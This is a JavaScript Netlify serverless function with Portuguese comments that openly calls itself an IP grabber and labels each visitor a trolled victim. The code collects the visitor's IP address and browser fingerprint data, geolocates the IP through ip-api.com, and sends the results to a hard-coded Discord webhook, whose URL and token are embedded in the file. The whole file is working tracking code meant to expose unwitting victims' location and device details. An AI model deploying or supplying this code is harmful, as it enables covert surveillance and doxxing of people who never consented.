// Lembre-se de colar seu webhook real aqui
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1564814951506251786/-4rphbXVLSBgwscTh_VmjduqFyZWP5S2SYhy-UqqyzxdD8n_c6ZnqOnO3sNlOG6bkvVz';

exports.handler = async (event) => {
  // O Netlify passa o body como string, então precisamos parsear
  const body = JSON.parse(event.body || '{}');
  
  // No Netlify, o IP real pode estar no header 'x-forwarded-for' ou no contexto do request
  const ip = event.headers['x-forwarded-for']?.split(',')[0].trim() || event.headers['cf-connecting-ip'] || 'IP Desconhecido';

  const data = {
    userAgent: body.userAgent,
    platform: body.platform,
    language: body.language,
    screenRes: body.screenRes,
    timezone: body.timezone,
    cookiesEnabled: body.cookiesEnabled,
    isMobile: body.isMobile,
    url: body.url,
    referrer: body.referrer,
    timestamp: body.timestamp
  };

  // Geolocalização
  let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,city,isp,as,query`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') {
      geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
    }
  } catch (e) {
    console.warn('Geo lookup failed:', e.message);
  }

  const finalData = {
    ip: ip,
    city: geoInfo.city,
    country: geoInfo.country,
    isp: geoInfo.isp,
    platform: data.platform,
    isMobile: data.isMobile,
    language: data.language,
    screenRes: data.screenRes,
    timezone: data.timezone,
    referrer: data.referrer
  };

  // Envia para o Discord
  const discordPayload = {
    username: 'NEEGY THE IP GRABBER',
    embeds: [
      {
        title: `VITIMA TROLADA: ${ip}`,
        color: 0xff00ff,
        fields: [
          { name: 'Local', value: `${geoInfo.city}, ${geoInfo.country}`, inline: true },
          { name: 'ISP', value: geoInfo.isp, inline: true },
          { name: 'OS', value: data.platform, inline: true },
          { name: 'Mobile', value: data.isMobile ? 'Sim' : 'Não', inline: true },
          { name: 'Idioma', value: data.language, inline: true },
          { name: 'Res', value: data.screenRes, inline: true },
          { name: 'TZ', value: data.timezone, inline: true },
          { name: 'Referrer', value: data.referrer || 'Direto', inline: false }
        ],
        footer: { text: `UA: ${data.userAgent}` },
        timestamp: data.timestamp
      }
    ]
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordPayload)
    });
  } catch (error) {
    console.error('Webhook Error:', error);
  }

  // Retorna os dados para o frontend
  return {
    statusCode: 200,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(finalData)
  };
};